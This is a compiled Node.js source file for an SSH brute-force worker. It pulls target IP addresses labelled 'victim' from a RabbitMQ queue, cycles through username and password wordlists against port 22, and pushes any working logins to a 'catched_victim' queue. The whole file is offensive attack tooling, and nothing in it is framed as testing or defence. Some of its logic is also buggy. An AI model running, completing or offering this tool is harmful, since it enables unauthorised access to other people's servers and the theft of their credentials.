'use strict';

var _regenerator = require('babel-runtime/regenerator');

var _regenerator2 = _interopRequireDefault(_regenerator);

var _asyncToGenerator2 = require('babel-runtime/helpers/asyncToGenerator');

var _asyncToGenerator3 = _interopRequireDefault(_asyncToGenerator2);

var _classCallCheck2 = require('babel-runtime/helpers/classCallCheck');

var _classCallCheck3 = _interopRequireDefault(_classCallCheck2);

var _createClass2 = require('babel-runtime/helpers/createClass');

var _createClass3 = _interopRequireDefault(_createClass2);

var _possibleConstructorReturn2 = require('babel-runtime/helpers/possibleConstructorReturn');

var _possibleConstructorReturn3 = _interopRequireDefault(_possibleConstructorReturn2);

var _inherits2 = require('babel-runtime/helpers/inherits');

var _inherits3 = _interopRequireDefault(_inherits2);

require('babel-polyfill');

var _amqplib = require('amqplib');

var _amqplib2 = _interopRequireDefault(_amqplib);

var _fs = require('fs');

var _fs2 = _interopRequireDefault(_fs);

var _os = require('os');

var _os2 = _interopRequireDefault(_os);

var _path = require('path');

var _path2 = _interopRequireDefault(_path);

var _eventemitter = require('eventemitter3');

var _eventemitter2 = _interopRequireDefault(_eventemitter);

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

// IMPORT LIB
var Client = require('ssh2').Client;
// GET DATA FROM DOCS FILE

// CLASS WORKER

var Worker = function (_event) {
    (0, _inherits3.default)(Worker, _event);

    function Worker(url) {
        (0, _classCallCheck3.default)(this, Worker);

        var _this = (0, _possibleConstructorReturn3.default)(this, (Worker.__proto__ || Object.getPrototypeOf(Worker)).call(this));

        _this.amqpURL = url;
        _this.usernamePos = 0;
        _this.passwordPos = 0;
        _this.interval = "";
        _this.message = "";
        return _this;
    }

    (0, _createClass3.default)(Worker, [{
        key: 'loadData',
        value: function loadData() {
            this.passwordData = _fs2.default.readFileSync(_path2.default.join(__dirname + '/docs/password.txt'));
            this.usernameData = _fs2.default.readFileSync(_path2.default.join(__dirname + "/docs/username.txt"));
            //TRANFER IT TO ARRAYLIST AND SPLIT \n
            this.passwordList = this.passwordData.toString().split(_os2.default.EOL);
            this.usernameList = this.usernameData.toString().split(_os2.default.EOL);
        }
    }, {
        key: 'listen_for_event',
        value: function listen_for_event() {
            var _this2 = this;

            // LISTEN FOR SUCCESS CASE
            this.on("success", function (victim) {
                var msg = JSON.stringify(victim);
                _this2.channel.sendToQueue('catched_victim', Buffer.from(msg), {
                    persistent: true
                });
                _this2.emit("end");
            });

            //LISTEN FOR END CASE
            this.on("end", function () {
                _this2.usernamePos = 0;
                _this2.passwordPos = 0;
                clearInterval(_this2.interval);
                _this2.channel.ack(_this2.message);
            });

            // LISTEN FOR NEXT CASE
            this.on("next", function () {
                if (_this2.passwordPos < _this2.passwordList.length - 1) {
                    _this2.handle_victim(_this2.message, _this2.usernameList[_this2.usernamePos], _this2.passwordList[_this2.passwordPos]);
                    _this2.passwordPos++;
                } else if (_this2.passwordPos == _this2.passwordList.length - 1) {
                    _this2.usernamePos++;
                    _this2.passwordPos = 0;
                    _this2.handle_victim(_this2.message, _this2.usernameList[_this2.usernamePos], _this2.passwordList[_this2.passwordPos]);
                } else if (_this2.usernamePos == _this2.usernameList.length - 1 && _this2.passwordPos == _this2.passwordList.length - 1) {
                    _this2.emit("end");
                }
            });
        }
    }, {
        key: 'getVictim',
        value: function () {
            var _ref = (0, _asyncToGenerator3.default)( /*#__PURE__*/_regenerator2.default.mark(function _callee(q) {
                var _this3 = this;

                return _regenerator2.default.wrap(function _callee$(_context) {
                    while (1) {
                        switch (_context.prev = _context.next) {
                            case 0:
                                _context.next = 2;
                                return _amqplib2.default.connect(this.amqpURL);

                            case 2:
                                this.connection = _context.sent;
                                _context.next = 5;
                                return this.connection.createChannel();

                            case 5:
                                this.channel = _context.sent;

                                // JOIN THE QUERE Q => victim
                                this.channel.assertQueue(q, {
                                    durable: true
                                });
                                // LIMIT MESSAGE TO EXECUTE
                                this.channel.prefetch(1);
                                console.log("listen for quere:" + q);
                                // LISTEN FOR MESSAGE SIGNAL FROM QUERE Q => victim
                                this.channel.consume(q, function (msg) {
                                    if (msg) {
                                        _this3.message = msg.content.toString();
                                        _this3.interval = setInterval(function () {
                                            _this3.emit("next");
                                        }, 200);
                                    }
                                }, {
                                    noAck: true
                                });

                            case 10:
                            case 'end':
                                return _context.stop();
                        }
                    }
                }, _callee, this);
            }));

            function getVictim(_x) {
                return _ref.apply(this, arguments);
            }

            return getVictim;
        }()
        // FUNCTION TO STORE VICTIM TO DATABASE

    }, {
        key: 'handle_victim',
        value: function () {
            var _ref2 = (0, _asyncToGenerator3.default)( /*#__PURE__*/_regenerator2.default.mark(function _callee2(ip, username, password) {
                var _this4 = this;

                return _regenerator2.default.wrap(function _callee2$(_context2) {
                    while (1) {
                        switch (_context2.prev = _context2.next) {
                            case 0:
                                // PARAMETER:
                                // ip:IP OF THE VICTIM
                                // username:username of ssh list
                                //password:password of the ssh list
                                this.client = new Client();
                                console.log(username + "---" + password);
                                // HANDLE ERROR CASE
                                this.client.on("error", function (err) {
                                    console.log(err);
                                }).on("ready", function () {
                                    console.log("SUCCESS WITH IP " + ip);
                                    var victim = {
                                        port: client.config.port,
                                        IP: client.config.host,
                                        username: client.config.username,
                                        password: client.config.password
                                    };
                                    _this4.client.end();
                                    _this4.emit("success", victim);
                                }).connect({
                                    port: 22,
                                    host: ip,
                                    username: username,
                                    password: password,
                                    readyTimeout: 5000
                                });

                            case 3:
                            case 'end':
                                return _context2.stop();
                        }
                    }
                }, _callee2, this);
            }));

            function handle_victim(_x2, _x3, _x4) {
                return _ref2.apply(this, arguments);
            }

            return handle_victim;
        }()
    }, {
        key: 'reTest',
        value: function reTest(ip, username, password) {
            console.log("RETEST THE ERROR CONNECTION");
            this.handle_victim(ip, username, password);
        }
    }]);
    return Worker;
}(_eventemitter2.default);

var worker = new Worker('amqp://localhost');
worker.loadData();
worker.listen_for_event();
worker.getVictim('victim');